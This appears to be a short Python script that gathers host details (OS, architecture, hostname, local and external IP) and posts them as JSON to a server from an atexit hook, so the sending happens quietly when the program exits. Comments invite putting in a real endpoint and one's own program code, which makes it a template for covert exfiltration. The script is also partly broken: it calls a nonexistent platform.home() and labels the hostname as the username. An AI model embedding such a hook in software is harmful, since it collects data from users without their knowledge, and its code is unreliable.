import atexit
import json
import platform
import socket
import requests

def collect_system_info():
    system_info = {
        "OS": platform.system(),
        "Arch": platform.architecture(),
        "Username": platform.node(),
        "Home": platform.home(),
        "Local IP": socket.gethostbyname(socket.gethostname()),
        "External IP": requests.get("https://api64.ipify.org?format=json").json()["ip"]
    }
    return json.dumps(system_info, indent=2)

def send_info_to_server(json_data):
    # Replace the following URL with the actual endpoint you want to send the data to
    server_url = "https://127.0.0.1:8080"
    response = requests.post(server_url, data=json_data, headers={'Content-Type': 'application/json'})
    if response.status_code == 200:
        print("System info sent successfully.")
    else:
        print(f"Failed to send system info. Status code: {response.status_code}")

# Register the exit handler
atexit.register(lambda: send_info_to_server(collect_system_info()))

# Your program code here

# Simulate exit
exit(0)
